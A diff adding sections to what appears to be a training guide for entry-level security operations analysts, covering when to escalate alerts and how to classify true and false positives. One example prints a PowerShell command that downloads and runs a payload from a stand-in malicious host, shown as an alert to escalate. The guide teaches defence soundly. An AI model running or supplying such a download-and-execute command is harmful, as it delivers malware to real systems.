@@ -401,3 +401,123 @@ Some alerts are just "FYI" – they require documentation but no action.
 - Scheduled maintenance activity
 
 **Action:** Document and close
+
+
+### WHEN TO ESCALATE
+
+ **ALWAYS ESCALATE These Scenarios:**
+
+#### 1. Confirmed Security Incidents ==(True Positives)==
+
+| Incident Type | Why Escalate | Example |
+| :--- | :--- | :--- |
+| Malware Execution | Needs forensic analysis, may have spread | Ransomware, trojan executed on system |
+| Account Compromise | Needs credential reset across systems, check for data exfiltration | Attacker logged in with stolen credentials |
+| Data Breach | Legal/compliance implications, requires incident response team | Sensitive data sent to external email |
+| Command & Control (C2) | Active attacker connection, needs immediate containment | System communicating with C2 server |
+| Lateral Movement | Attack spreading across network | Attacker moved from workstation to server |
+| Privilege Escalation | Attacker gained admin rights | Standard user suddenly has domain admin privileges |
+
+#### 2. Attacks on Critical Assets
+
+**If the affected system is critical, escalate immediately:**
+
+| Critical Asset | Why Critical | Escalation Priority |
+| :--- | :--- | :--- |
+| Domain Controller | Controls entire network authentication | 🔴 CRITICAL |
+| Database Server | Contains sensitive customer/financial data | 🔴 CRITICAL |
+| Email Server | Communication backbone, potential data leak | 🔴 HIGH |
+| Web Server (public-facing) | Brand reputation, customer trust | 🔴 HIGH |
+| CEO/CFO/Executive laptop | High-value target, sensitive information | 🔴 HIGH |
+
+Even a "minor" alert on a critical asset = ESCALATE
+
+
+#### 3. You're Unsure or Out of Your Depth
+It's ALWAYS better to escalate if:
+
+- ❓ You don't understand what's happening
+- ❓ The alert involves tools/systems you're unfamiliar with
+- ❓ Investigation reveals unusual patterns you can't explain
+- ❓ The playbook doesn't cover this scenario
+- ❓ You've spent >30 minutes and still can't determine True/False Positive
+
+```
+Alert: "Unusual PowerShell command executed"
+Command: 
+IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload')
+
+Your thought: "I know PowerShell can be dangerous, but I'm not sure 
+              if this specific command is malicious..."
+
+✅ CORRECT ACTION: ESCALATE to L2
+(Don't guess - this is obfuscated malware download)
+```
+
+
+#### 4. Multiple Related Alerts (Possible Attack Chain)
+
+If you see a pattern of alerts from the same user/system:
+
+**Example Attack Chain:**
+```
+10:15 - Phishing email received by user
+10:17 - User clicked link in email
+10:20 - Malware downloaded
+10:22 - Malware executed
+10:25 - Outbound connection to suspicious IP
+10:30 - Unusual file encryption activity
+```
+
+Escalate immediately – L2 needs to see the full picture
+
+#### 5. Incidents Involving Legal/Compliance Issues
+Escalate if the incident involves:
+
+- 🔒 Data breaches (PII, PHI, PCI data exposed)
+- 🔒 Regulatory violations (GDPR, HIPAA, SOX)
+- 🔒 Insider threats (employee stealing data)
+- 🔒 Law enforcement involvement (hacking, fraud, terrorism-related)
+
+These require management and legal team involvement
+
+
+____
+
+
+# 4: True Positive / False Positive / False Negative
+**As an L1 analyst, your primary job is to classify alerts correctly:**
+
+- ✅ Is this a real threat (True Positive)?
+- ✅ Is this a false alarm (False Positive)?
+- ✅ Did we miss a threat (False Negative)?
+
+
+#### The Four Alert Classifications
+```
+                    ACTUAL THREAT EXISTS?
+                    YES         |    NO
+                    ____________|____________
+         YES    |               |
+ALERT    TRUE POSITIVE  | FALSE POSITIVE
+FIRED?          ✅      |      ❌
+         ______|_______|____________
+         NO     |               |
+         FALSE NEGATIVE | TRUE NEGATIVE
+                ⚠️      |      ✅
+```
+
+## 1) TRUE POSITIVE (TP)
+An alert fired AND there is a real security threat.
+
+**In simple terms:** The alert is correct – there's actually something bad happening!
+
+**Examples:**
+
+
+
+**How to Confirm True Positive:**
+- ✅ Evidence of malicious activity (not just suspicious)
+- ✅ Indicators of Compromise (IOCs) match known threats
+- ✅ Behavioral analysis confirms attack pattern
+- ✅ Impact is visible (files encrypted, data stolen, system compromised)
